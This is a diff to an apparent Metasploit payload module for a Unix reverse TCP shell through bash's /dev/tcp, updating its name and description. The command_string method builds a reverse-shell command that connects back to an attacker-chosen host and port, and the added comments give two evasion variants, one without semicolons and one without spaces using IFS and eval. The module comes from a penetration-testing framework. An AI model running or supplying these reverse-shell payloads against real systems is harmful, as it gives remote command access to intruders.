@@ -21,9 +21,14 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Unix Command, Double reverse TCP connection (/dev/tcp)',
+			'Name'          => 'Unix Command Shell, Reverse TCP (/dev/tcp)',
 			'Version'       => '$Revision$',
-			'Description'   => 'Creates an interactive shell through two inbound connections',
+			'Description'   => %q{
+				Creates an interactive shell via bash's builtin /dev/tcp.
+				This will not work on most Debian-based Linux distributions
+				(including Ubuntu) because they compile bash without the
+				/dev/tcp feature.
+				},
 			'Author'        => 'hdm',
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
@@ -52,5 +57,9 @@ module Metasploit3
 	def command_string
 		fd = rand(200) + 20
 		return "0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}";
+		# same thing, no semicolons
+		#return "/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}"
+		# same thing, no spaces
+		#return "s=${IFS:0:1};eval$s\"bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\""
 	end
 end
